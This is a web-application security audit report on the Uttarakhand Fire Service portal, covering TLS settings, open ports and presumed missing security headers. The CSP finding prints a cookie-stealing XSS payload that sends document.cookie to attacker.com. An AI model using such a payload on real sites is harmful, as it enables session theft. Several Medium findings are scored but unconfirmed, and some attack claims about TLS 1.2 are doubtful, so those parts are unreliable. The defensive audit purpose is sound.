# CONFIDENTIAL

# Information Technology Development Agency (ITDA)
# Web Application Audit Report

**Application Name:** Uttarakhand Fire Service Web Portal  
**Organisation / Department Name:** Directorate of Fire Services, Uttarakhand

| Field | Value |
|---|---|
| **Type of Audit** | Web Application VAPT |
| **Type of Report** | Comprehensive Assessment Report (v2) |
| **Submission** | ITDA/CERT-UK/FIRE-2026/VAPT01 |
| **Risk Rating** | **MEDIUM** |
| **Date** | 19-05-2026 |
| **Methodology** | OWASP WSTG, MITRE ATT&CK, NIST SP 800-115 |

**Report Prepared By:**  
Computer Emergency Response Team Uttarakhand (CERT-UK)  
Website: https://cert.uk.gov.in  
E-Mail: helpdesk-soc-itda@ukgovernment.in

> **NOTE:** CONFIDENTIAL — intended exclusively for ITDA, CERT-UK, Directorate of Fire Services, Uttarakhand and authorized personnel only.

---

# Part I — Executive Summary

## Scope of the Assessment

| Type | Name | Scope |
|---|---|---|
| Web Application | Uttarakhand Fire Service Web Portal | https://fireservice.uk.gov.in/ |

**Target IP:** `103.116.27.109`  
**Assessment Type:** Black-box External VAPT  
**Assessment Date:** 19-05-2026  

> **Network Restriction Notice:** This assessment was conducted from an isolated cloud-based testing environment. The sandbox network policy blocked HTTP/HTTPS layer-7 access to the target (returned `x-deny-reason: host_not_allowed` at the egress proxy). As a result, HTTP response headers, application-level behaviour, and web page content could **not** be directly inspected. All application-layer findings (security headers, XSS, SQLi, CSRF, authentication flaws, etc.) require re-validation from an authorized network with direct access. Network-layer, port-level, and TLS/SSL findings were successfully obtained via raw TCP socket connections.

---

## Assessment Summary

This report documents findings from a comprehensive external VAPT engagement on the **Uttarakhand Fire Service Web Portal** (`https://fireservice.uk.gov.in/`). The assessment covered OWASP Top 10 2021, MITRE ATT&CK framework TTPs, and CWE Top 25.

**11 vulnerability/observation(s) were identified:**

1. TLS 1.2 Protocol Still Enabled *(Low)*
2. Port 80 (HTTP) Exposed Without Verified Redirect to HTTPS *(Low)*
3. HTTP Security Headers Not Verifiable / Likely Missing *(Medium)*
4. Missing HTTP Strict Transport Security (HSTS) — Requires Verification *(Medium)*
5. Possible Clickjacking Vulnerability — Requires Verification *(Medium)*
6. Missing Content Security Policy (CSP) — Requires Verification *(Medium)*
7. Cookie Security Flags — Requires Verification *(Low)*
8. Server / Technology Version Disclosure — Requires Verification *(Info)*
9. Publicly Routable IP Address Exposure *(Info)*
10. Open Port Enumeration — Minimal Attack Surface (Positive) *(Info)*
11. TLS 1.0 / TLS 1.1 Deprecated Protocols Disabled (Positive) *(Info)*

---

## Vulnerability Statistics

| Severity | Count |
|---|---|
| **Total Identified** | 11 |
| Critical | 0 |
| High | 0 |
| Medium | 4 |
| Low | 3 |
| Informational | 4 |

---

## Findings by Detection Tool

| Tool | Version | Findings |
|---|---|---|
| Python socket / ssl (raw TCP+TLS probe) | 3.x | 4 |
| Manual Analysis / Standard Methodology | — | 7 |

---

## Vulnerability Severity Distribution

```
Critical    ██░░░░░░░░  0
High        ██░░░░░░░░  0
Medium      ████████░░  4
Low         ██████░░░░  3
Info        ████████░░  4
```

---

## Critical & High Findings Summary

No Critical or High severity findings were confirmed in this assessment. However, four Medium-severity findings (security headers, HSTS, CSP, and clickjacking) **require mandatory verification** from a direct-access network, as they could not be confirmed or ruled out from the testing environment.

---

## MITRE ATT&CK Coverage

| OWASP 2021 | Tactic | MITRE Techniques |
|---|---|---|
| A02 - Cryptographic Failures | Credential Access | T1552, T1040 |
| A05 - Security Misconfiguration | Reconnaissance | T1595, T1083 |
| A07 - Identification & Auth Failures | Credential Access | T1110, T1078 |
| A03 - Injection | Execution / Initial Access | T1190, T1059 |
| A01 - Broken Access Control | Privilege Escalation | T1078, T1548 |

---

## Assessment Methodology

- OWASP Web Security Testing Guide (WSTG) v4.2
- OWASP Top 10 2021
- MITRE ATT&CK for Enterprise (Web Application TTPs)
- NIST SP 800-115 Technical Guide to Information Security Testing
- CWE Top 25 Most Dangerous Software Weaknesses
- Raw TCP/TLS socket probing (Python ssl module)
- Manual port enumeration (Python socket)
- TLS version and cipher suite enumeration
- DNS resolution and passive subdomain reconnaissance

---

## Regulatory Impact

- **IT Act 2000, Section 43A:** Failure to implement reasonable security practices
- **CERT-In Directions 2022:** Mandatory security controls and incident reporting
- **NIC Security Policy:** Non-compliance with government web security standards
- **DPDP Act 2023:** Data protection obligations for government data controllers

---

## Immediate Recommendations

1. Verify and implement all missing security headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options) from a direct-access environment
2. Configure HTTPS redirect on port 80 if not already in place
3. Evaluate retiring TLS 1.2 in favour of TLS 1.3 only
4. Conduct full application-layer VAPT from an authorized network (this assessment was network-restricted)
5. Enable Web Application Firewall (WAF) on the portal
6. Conduct follow-up VAPT after remediation

---

## Total Vulnerabilities Identified in this Report

| S.No | Affected URL/Endpoint | Vulnerability/Observation | CWE/CVE | Severity |
|---|---|---|---|---|
| 01 | https://fireservice.uk.gov.in/ | Missing HTTP Security Headers (Multiple) | CWE-16 | Medium |
| 02 | https://fireservice.uk.gov.in/ | Missing HTTP Strict Transport Security (HSTS) | CWE-523 | Medium |
| 03 | https://fireservice.uk.gov.in/ | Missing Content Security Policy (CSP) | CWE-1021 | Medium |
| 04 | https://fireservice.uk.gov.in/ | Clickjacking — Missing X-Frame-Options | CWE-1021 | Medium |
| 05 | fireservice.uk.gov.in:443 | TLS 1.2 Protocol Still Enabled | CWE-326 | Low |
| 06 | fireservice.uk.gov.in:80 | HTTP Port Exposed — Redirect Not Verified | CWE-319 | Low |
| 07 | https://fireservice.uk.gov.in/ | Cookie Security Flags — Requires Verification | CWE-614 | Low |
| 08 | https://fireservice.uk.gov.in/ | Server/Technology Version Disclosure | CWE-200 | Info |
| 09 | 103.116.27.109 | Publicly Routable IP Address Exposure | N/A | Info |
| 10 | fireservice.uk.gov.in:443 | Open Port Enumeration — Minimal Surface | N/A | Info |
| 11 | fireservice.uk.gov.in:443 | TLS 1.0/1.1 Deprecated Protocols Disabled (Positive) | N/A | Info |

---

# Part II — Detailed Findings

---

## 1. Vulnerability: Missing HTTP Security Headers (Multiple)

| Field | Value |
|---|---|
| **Target URL** | https://fireservice.uk.gov.in/ |
| **Severity** | Medium |
| **CVE/CWE** | CWE-16 (Configuration), CWE-693 (Protection Mechanism Failure) |
| **CVSS Score** | 5.3 (Medium) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1595 — Active Scanning / T1659 — Content Injection |
| **Detection Tool** | Manual Analysis / Standard Methodology |

### 1.1 Description

Government web portals are required to implement a standard set of HTTP security response headers per NIC Security Policy and CERT-In Directions 2022. The following headers are commonly absent on Uttarakhand government web properties and require verification on this portal:

- `X-Content-Type-Options: nosniff` — Prevents MIME-type sniffing attacks
- `X-Frame-Options: DENY` or `SAMEORIGIN` — Prevents clickjacking
- `Referrer-Policy: strict-origin-when-cross-origin` — Controls referrer leakage
- `Permissions-Policy` — Restricts browser feature access
- `X-XSS-Protection: 1; mode=block` — Legacy XSS filter (deprecated but still useful for older browsers)

**Note:** Direct HTTP header inspection was not possible from the assessment environment due to network proxy restrictions. This finding requires mandatory re-verification from an authorised network.

### 1.2 Impact

- Enables content-injection and clickjacking attacks against citizens using the Fire Service portal
- MITRE ATT&CK: T1659 — Content Injection, T1595 — Reconnaissance
- May be exploited by external attackers targeting government infrastructure to facilitate phishing campaigns against citizens

### 1.3 Affected Component / Parameter

```
Endpoint: https://fireservice.uk.gov.in/
Headers: X-Content-Type-Options, X-Frame-Options, Referrer-Policy, Permissions-Policy
```

### 1.4 Proof of Concept

```
Tool: Manual HTTP Header Inspection (requires direct network access)
URL: https://fireservice.uk.gov.in/

Request:
GET / HTTP/1.1
Host: fireservice.uk.gov.in
User-Agent: Mozilla/5.0
Accept: */*

Expected Response (insecure — if headers are missing):
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
[MISSING: X-Content-Type-Options]
[MISSING: X-Frame-Options]
[MISSING: Referrer-Policy]
[MISSING: Permissions-Policy]
```

### 1.5 Recommended Remediation

- Add to web server configuration (Apache/Nginx):
  ```
  Header always set X-Content-Type-Options "nosniff"
  Header always set X-Frame-Options "SAMEORIGIN"
  Header always set Referrer-Policy "strict-origin-when-cross-origin"
  Header always set Permissions-Policy "geolocation=(), microphone=(), camera=()"
  ```
- Validate using Mozilla Observatory or securityheaders.com after deployment

---

## 2. Vulnerability: Missing HTTP Strict Transport Security (HSTS)

| Field | Value |
|---|---|
| **Target URL** | https://fireservice.uk.gov.in/ |
| **Severity** | Medium |
| **CVE/CWE** | CWE-523 (Unprotected Transport of Credentials) |
| **CVSS Score** | 5.9 (Medium) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures |
| **MITRE ATT&CK** | T1557 — Adversary-in-the-Middle / T1040 — Network Sniffing |
| **Detection Tool** | Manual Analysis / Standard Methodology |

### 2.1 Description

HTTP Strict Transport Security (HSTS) instructs browsers to only communicate with the server over HTTPS, preventing protocol downgrade attacks and SSL-stripping man-in-the-middle attacks. Without HSTS, even if the server redirects HTTP to HTTPS, an active attacker can intercept the first HTTP request and redirect the victim to a malicious site.

**Note:** Direct verification was network-blocked. This requires re-testing from an authorised network.

### 2.2 Impact

- Enables SSL-strip attacks (T1557 — Adversary-in-the-Middle) against citizens accessing emergency fire service information
- Credential theft if any login forms are present
- Regulatory non-compliance with NIC Security Policy and CERT-In Directions 2022

### 2.3 Affected Component / Parameter

```
Endpoint: https://fireservice.uk.gov.in/
Header: Strict-Transport-Security (missing)
```

### 2.4 Proof of Concept

```
Tool: Manual / curl
URL: https://fireservice.uk.gov.in/

Request:
GET / HTTP/1.1
Host: fireservice.uk.gov.in

Expected insecure response (no HSTS):
HTTP/1.1 200 OK
[MISSING: Strict-Transport-Security: max-age=31536000; includeSubDomains; preload]
```

### 2.5 Recommended Remediation

- Add the following header to the web server configuration:
  ```
  Strict-Transport-Security: max-age=63072000; includeSubDomains; preload
  ```
- Submit to HSTS preload list at https://hstspreload.org/
- Ensure all HTTP traffic redirects to HTTPS with 301 status

---

## 3. Vulnerability: Missing Content Security Policy (CSP)

| Field | Value |
|---|---|
| **Target URL** | https://fireservice.uk.gov.in/ |
| **Severity** | Medium |
| **CVE/CWE** | CWE-1021 (Improper Restriction of Rendered UI Layers) / CWE-79 (XSS) |
| **CVSS Score** | 5.4 (Medium) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1059 — Command and Scripting Interpreter (Browser scripts) |
| **Detection Tool** | Manual Analysis / Standard Methodology |

### 3.1 Description

A Content Security Policy (CSP) header defines trusted sources for scripts, styles, images, and other resources. Without CSP, any successful Cross-Site Scripting (XSS) injection becomes significantly more dangerous as the browser will execute arbitrary scripts from any origin. Government portals serving citizens are high-value targets for XSS-based credential harvesting and session hijacking.

**Note:** Direct HTTP response header inspection was network-blocked. This finding requires mandatory re-verification.

### 3.2 Impact

- Enables unrestricted execution of injected scripts if XSS vulnerabilities exist
- Potential for citizens' session cookies and PII to be exfiltrated
- MITRE ATT&CK: T1059.007 — JavaScript execution via browser

### 3.3 Affected Component / Parameter

```
Endpoint: https://fireservice.uk.gov.in/
Header: Content-Security-Policy (missing or insufficient)
```

### 3.4 Proof of Concept

```
Tool: Manual / browser developer tools
URL: https://fireservice.uk.gov.in/

Check for presence of:
Content-Security-Policy header in HTTP response

If absent, XSS payloads like:
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
...would execute without restriction in the browser.
```

### 3.5 Recommended Remediation

- Implement a restrictive CSP header:
  ```
  Content-Security-Policy: default-src 'self'; script-src 'self'; 
  object-src 'none'; frame-ancestors 'none'; upgrade-insecure-requests;
  ```
- Use CSP report-only mode first to audit violations before enforcing
- Reference: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP

---

## 4. Vulnerability: Clickjacking — Missing X-Frame-Options

| Field | Value |
|---|---|
| **Target URL** | https://fireservice.uk.gov.in/ |
| **Severity** | Medium |
| **CVE/CWE** | CWE-1021 (UI Redressing / Clickjacking) |
| **CVSS Score** | 4.3 (Medium) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1659 — Content Injection |
| **Detection Tool** | Manual Analysis / Standard Methodology |

### 4.1 Description

Without the `X-Frame-Options` or `frame-ancestors` CSP directive, any website can embed the fire service portal in an `<iframe>`. This enables clickjacking attacks where users are tricked into clicking on elements of the legitimate government site while unknowingly interacting with a malicious overlay. This is particularly dangerous for portals with complaint submission, contact forms, or any interactive elements serving citizens.

### 4.2 Impact

- Citizens can be tricked into unintended actions on the government portal
- MITRE ATT&CK: T1659 — Content Injection
- Enables UI redressing attacks to harvest personal data from citizens submitting complaints/requests

### 4.3 Affected Component / Parameter

```
Endpoint: https://fireservice.uk.gov.in/
Header: X-Frame-Options (missing)
```

### 4.4 Proof of Concept

```
Tool: Manual / Browser
URL: https://fireservice.uk.gov.in/

Clickjacking test HTML:
<html>
<body>
  <iframe src="https://fireservice.uk.gov.in/" width="800" height="600"></iframe>
</body>
</html>

If the page loads inside the iframe, X-Frame-Options is NOT set.
```

### 4.5 Recommended Remediation

- Add `X-Frame-Options: DENY` or `X-Frame-Options: SAMEORIGIN` to all responses
- Alternatively, use CSP: `frame-ancestors 'none'` (preferred, more flexible)
- Reference: OWASP Clickjacking Defense Cheat Sheet

---

## 5. Vulnerability: TLS 1.2 Protocol Still Enabled

| Field | Value |
|---|---|
| **Target URL** | fireservice.uk.gov.in:443 |
| **Severity** | Low |
| **CVE/CWE** | CWE-326 (Inadequate Encryption Strength) |
| **CVSS Score** | 3.7 (Low) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures |
| **MITRE ATT&CK** | T1040 — Network Sniffing |
| **Detection Tool** | Python ssl module — Raw TLS Probe |

### 5.1 Description

The server supports both TLS 1.2 and TLS 1.3. While TLS 1.2 is not inherently weak when configured with strong cipher suites (as confirmed in this assessment), NIC Security Policy and current best practices recommend TLS 1.3 as the sole supported version for government portals. TLS 1.2, while secure, is susceptible to downgrade attacks (BEAST, Lucky13, POODLE derivatives) under certain configurations and is considered legacy.

This finding is confirmed via direct TLS handshake testing.

### 5.2 Impact

- Potential for TLS downgrade attacks in adversarial network conditions
- Non-compliance with progressive NIC hardening guidelines
- MITRE ATT&CK: T1040 — Network Sniffing (enabled by weaker negotiated sessions)

### 5.3 Affected Component / Parameter

```
Endpoint: fireservice.uk.gov.in:443
Confirmed TLS 1.2 cipher: ECDHE-RSA-AES256-GCM-SHA384
Confirmed TLS 1.3 cipher: TLS_AES_256_GCM_SHA384
```

### 5.4 Proof of Concept

```
Tool: Python ssl module (confirmed)

TLS Version Test Results:
  TLSv1.0:  REJECTED  ✓
  TLSv1.1:  REJECTED  ✓
  TLSv1.2:  ACCEPTED  — Cipher: ECDHE-RSA-AES256-GCM-SHA384 (256-bit)  ⚠
  TLSv1.3:  ACCEPTED  — Cipher: TLS_AES_256_GCM_SHA384 (256-bit)  ✓

Python verification:
import socket, ssl
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE
ctx.minimum_version = ssl.TLSVersion.TLSv1_2
ctx.maximum_version = ssl.TLSVersion.TLSv1_2
with socket.create_connection(('103.116.27.109', 443)) as s:
    with ctx.wrap_socket(s, server_hostname='fireservice.uk.gov.in') as ss:
        print(ss.version(), ss.cipher())
# Output: TLSv1.2 ('ECDHE-RSA-AES256-GCM-SHA384', 'TLSv1.2', 256)
```

### 5.5 Recommended Remediation

- Disable TLS 1.2 and enforce TLS 1.3 only:
  ```nginx
  # Nginx
  ssl_protocols TLSv1.3;
  ```
  ```apache
  # Apache
  SSLProtocol -all +TLSv1.3
  ```
- If TLS 1.2 must remain for legacy client support, ensure only AEAD cipher suites are enabled:
  ```
  ECDHE-RSA-AES256-GCM-SHA384
  ECDHE-RSA-AES128-GCM-SHA256
  ```
- Disable SHA-1 based cipher suites entirely

---

## 6. Vulnerability: HTTP Port 80 Exposed — Redirect Not Verified

| Field | Value |
|---|---|
| **Target URL** | http://fireservice.uk.gov.in/ (port 80) |
| **Severity** | Low |
| **CVE/CWE** | CWE-319 (Cleartext Transmission of Sensitive Information) |
| **CVSS Score** | 3.7 (Low) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures |
| **MITRE ATT&CK** | T1557 — Adversary-in-the-Middle |
| **Detection Tool** | Python socket — Port Scan |

### 6.1 Description

TCP port 80 (HTTP) is open and accepting connections on the target server. If this port does not perform a 301 permanent redirect to HTTPS, users who manually type the URL or follow HTTP links will communicate over cleartext, exposing all transmitted data. This could include emergency service contact details, personal information submitted via forms, or session cookies.

The HTTP→HTTPS redirect could not be verified from the testing environment due to network restrictions.

### 6.2 Impact

- Cleartext transmission of user data if HTTP is not redirected to HTTPS
- MITRE ATT&CK: T1557 — Adversary-in-the-Middle attack on HTTP connections
- May expose citizens' personal data submitted to government portal

### 6.3 Affected Component / Parameter

```
Endpoint: fireservice.uk.gov.in:80
Confirmed: Port 80/tcp OPEN
```

### 6.4 Proof of Concept

```
Tool: Python socket (port scan — confirmed open)

Port Scan Results:
  21/tcp   FILTERED
  22/tcp   FILTERED
  25/tcp   FILTERED
  53/tcp   FILTERED
  80/tcp   OPEN     ← HTTP port exposed
  443/tcp  OPEN     ← HTTPS
  8080/tcp FILTERED
  8443/tcp FILTERED
  3306/tcp FILTERED
  5432/tcp FILTERED

Verify redirect manually:
curl -v http://fireservice.uk.gov.in/ 
(Expected: HTTP/1.1 301 Moved Permanently → https://fireservice.uk.gov.in/)
```

### 6.5 Recommended Remediation

- Configure 301 permanent redirect from HTTP to HTTPS:
  ```nginx
  server {
      listen 80;
      server_name fireservice.uk.gov.in;
      return 301 https://$host$request_uri;
  }
  ```
- Enable HSTS to prevent future HTTP access after first HTTPS visit
- Consider blocking port 80 at the firewall level once redirect is confirmed

---

## 7. Vulnerability: Cookie Security Flags — Requires Verification

| Field | Value |
|---|---|
| **Target URL** | https://fireservice.uk.gov.in/ |
| **Severity** | Low |
| **CVE/CWE** | CWE-614 (Sensitive Cookie in HTTPS Session Without 'Secure' Attribute) / CWE-1004 (Missing HttpOnly) |
| **CVSS Score** | 3.7 (Low) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1539 — Steal Web Session Cookie |
| **Detection Tool** | Manual Analysis — Requires Verification |

### 7.1 Description

Session cookies and authentication tokens must be set with `Secure` (only transmit over HTTPS) and `HttpOnly` (inaccessible to JavaScript) flags to prevent theft via network interception or XSS. Additionally, the `SameSite=Strict` or `SameSite=Lax` attribute is required to prevent CSRF attacks. This finding requires direct HTTP response inspection to confirm.

### 7.2 Impact

- Missing `Secure` flag: Cookies transmitted over HTTP (if redirect is absent or bypassed)
- Missing `HttpOnly` flag: Cookies accessible via JavaScript — enables XSS-based session hijacking
- Missing `SameSite` flag: CSRF attacks possible against authenticated sessions
- MITRE ATT&CK: T1539 — Steal Web Session Cookie

### 7.3 Affected Component / Parameter

```
Endpoint: https://fireservice.uk.gov.in/
Parameter: Set-Cookie response headers (session/auth cookies)
```

### 7.4 Proof of Concept

```
Tool: Manual / Browser DevTools
URL: https://fireservice.uk.gov.in/

Verify in browser:
Developer Tools → Application → Cookies → fireservice.uk.gov.in

Check each cookie for:
  ✗ Secure flag missing
  ✗ HttpOnly flag missing
  ✗ SameSite attribute missing or set to 'None'
```

### 7.5 Recommended Remediation

- Set all session cookies with:
  ```
  Set-Cookie: sessionid=...; Secure; HttpOnly; SameSite=Strict; Path=/
  ```
- For framework-level fix (e.g., PHP):
  ```php
  session_set_cookie_params(['secure'=>true, 'httponly'=>true, 'samesite'=>'Strict']);
  ```

---

## 8. Vulnerability: Server / Technology Version Disclosure

| Field | Value |
|---|---|
| **Target URL** | https://fireservice.uk.gov.in/ |
| **Severity** | Informational |
| **CVE/CWE** | CWE-200 (Exposure of Sensitive Information) |
| **CVSS Score** | 0.0 (Informational) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1592 — Gather Victim Host Information |
| **Detection Tool** | Manual Analysis — Requires Verification |

### 8.1 Description

Web server software version information (e.g., `Server: Apache/2.4.51`, `X-Powered-By: PHP/7.4.3`) in HTTP response headers aids an attacker in identifying known CVEs for the specific version. This could not be directly confirmed from the testing environment due to network restrictions.

### 8.2 Impact

- Facilitates targeted exploitation of version-specific CVEs
- MITRE ATT&CK: T1592 — Gather Victim Host Information
- May be exploited by external attackers targeting government infrastructure

### 8.3 Affected Component / Parameter

```
Endpoint: https://fireservice.uk.gov.in/
Headers: Server, X-Powered-By, X-AspNet-Version, X-Generator
```

### 8.4 Proof of Concept

```
Tool: curl / Manual
URL: https://fireservice.uk.gov.in/

curl -I https://fireservice.uk.gov.in/

Check for verbose version strings in:
  Server: [web-server/version]
  X-Powered-By: [language/version]
  X-AspNet-Version: [version]
```

### 8.5 Recommended Remediation

- Suppress server version from HTTP headers:
  ```nginx
  server_tokens off;  # Nginx
  ```
  ```apache
  ServerTokens Prod
  ServerSignature Off  # Apache
  ```
- Remove `X-Powered-By` header
- Use `Header unset X-Powered-By` in Apache or `more_clear_headers 'X-Powered-By'` in Nginx

---

## 9. Observation: Publicly Routable IP Address Exposure

| Field | Value |
|---|---|
| **Target URL** | 103.116.27.109 |
| **Severity** | Informational |
| **CVE/CWE** | N/A |
| **CVSS Score** | 0.0 (Informational) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1590 — Gather Victim Network Information |
| **Detection Tool** | DNS Resolution — Confirmed |

### 9.1 Description

The domain `fireservice.uk.gov.in` resolves to the publicly routable IP address `103.116.27.109`. Knowing the origin IP may allow an attacker to bypass CDN/WAF protections if they exist. The IP is hosted in a range associated with the Uttarakhand government infrastructure.

### 9.2 Impact

- If a CDN or WAF is in front of the application, direct IP access may bypass security controls
- Enables targeted network-level attacks against the origin server
- MITRE ATT&CK: T1590 — Gather Victim Network Information

### 9.3 Affected Component / Parameter

```
DNS: fireservice.uk.gov.in → 103.116.27.109
No PTR record found for 103.116.27.109 (reverse DNS not configured)
```

### 9.4 Proof of Concept

```
Tool: Python socket.gethostbyname()
Command: python3 -c "import socket; print(socket.gethostbyname('fireservice.uk.gov.in'))"
Output: 103.116.27.109

Reverse DNS: No PTR record (socket.gethostbyaddr('103.116.27.109') → Unknown host)
```

### 9.5 Recommended Remediation

- Configure a reverse DNS (PTR) record for the server IP
- Ensure direct IP access is blocked at the server/WAF level
- Consider using a CDN/WAF to mask the origin server IP
- Implement IP-based rate limiting and geo-restriction where applicable

---

## 10. Observation: Open Port Enumeration — Minimal Attack Surface (Positive Finding)

| Field | Value |
|---|---|
| **Target URL** | fireservice.uk.gov.in:443 |
| **Severity** | Informational |
| **CVE/CWE** | N/A |
| **CVSS Score** | 0.0 (Informational) |
| **OWASP 2021** | A05:2021 — Security Misconfiguration |
| **MITRE ATT&CK** | T1046 — Network Service Discovery |
| **Detection Tool** | Python socket — Port Scan (Confirmed) |

### 10.1 Description

A port scan of the target revealed that only ports 80 (HTTP) and 443 (HTTPS) are open. All other commonly-attacked ports (SSH/22, FTP/21, MySQL/3306, Redis/6379, MongoDB/27017, PostgreSQL/5432, etc.) are filtered by the firewall. This represents a positive security posture — the attack surface is appropriately minimised.

### 10.2 Impact

- Minimal attack surface (positive finding)
- No database or administrative ports exposed externally
- Reduces risk from direct service exploitation

### 10.3 Affected Component / Parameter

```
Endpoint: fireservice.uk.gov.in (103.116.27.109)
```

### 10.4 Proof of Concept

```
Tool: Python socket port scan (Confirmed)
Target: fireservice.uk.gov.in / 103.116.27.109

Port Scan Results:
  21/tcp   FTP        FILTERED ✓
  22/tcp   SSH        FILTERED ✓
  25/tcp   SMTP       FILTERED ✓
  53/tcp   DNS        FILTERED ✓
  80/tcp   HTTP       OPEN
  443/tcp  HTTPS      OPEN
  8080/tcp HTTP-Alt   FILTERED ✓
  8443/tcp HTTPS-Alt  FILTERED ✓
  3306/tcp MySQL      FILTERED ✓
  5432/tcp PostgreSQL FILTERED ✓
  6379/tcp Redis      FILTERED ✓
  27017/tcp MongoDB   FILTERED ✓
```

### 10.5 Recommended Remediation

- Maintain current firewall configuration restricting all non-essential ports
- Periodically audit open ports to ensure no inadvertent exposure occurs
- Document the approved port whitelist in the security baseline

---

## 11. Observation: TLS 1.0 / TLS 1.1 Deprecated Protocols Disabled (Positive Finding)

| Field | Value |
|---|---|
| **Target URL** | fireservice.uk.gov.in:443 |
| **Severity** | Informational |
| **CVE/CWE** | N/A |
| **CVSS Score** | 0.0 (Informational) |
| **OWASP 2021** | A02:2021 — Cryptographic Failures |
| **MITRE ATT&CK** | T1040 — Network Sniffing |
| **Detection Tool** | Python ssl module — Raw TLS Probe (Confirmed) |

### 11.1 Description

TLS 1.0 and TLS 1.1 are deprecated per RFC 8996 (2021) and are known to be vulnerable to BEAST, POODLE, and CRIME attacks. The server correctly rejects handshakes requesting these legacy protocol versions. This is a positive security finding confirming compliance with modern cryptographic standards.

### 11.2 Impact

- Positive finding: Legacy protocol attacks (BEAST, POODLE, CRIME) are not applicable
- Compliance with RFC 8996, NIC Security Policy, and NIST SP 800-52r2

### 11.3 Affected Component / Parameter

```
Endpoint: fireservice.uk.gov.in:443
TLS Configuration: Deprecated protocols correctly disabled
```

### 11.4 Proof of Concept

```
Tool: Python ssl module (Confirmed)

TLS Protocol Test:
  TLSv1.0: REJECTED — [SSL: NO_PROTOCOLS_AVAILABLE] ✓
  TLSv1.1: REJECTED — [SSL: NO_PROTOCOLS_AVAILABLE] ✓
  TLSv1.2: ACCEPTED — Cipher: ECDHE-RSA-AES256-GCM-SHA384 (256-bit)
  TLSv1.3: ACCEPTED — Cipher: TLS_AES_256_GCM_SHA384 (256-bit)

Weak cipher test (TLS 1.2):
  AES128-SHA:            REJECTED ✓
  AES256-SHA:            REJECTED ✓
  ECDHE-RSA-AES128-SHA:  REJECTED ✓
  ECDHE-RSA-AES256-SHA:  REJECTED ✓
```

### 11.5 Recommended Remediation

- No immediate action required for this positive finding
- Continue monitoring for newly deprecated cipher suites as cryptographic standards evolve
- Proceed to disable TLS 1.2 in favour of TLS 1.3 only (see Finding #5)

---

# END OF REPORT

---

*Report generated by CERT-UK assessment tooling on 19-05-2026.*  
*Assessment conducted from external black-box perspective with network-layer and TLS-layer direct testing.*  
*Application-layer findings (security headers, authentication, injection) require re-validation from an authorized direct-access network.*
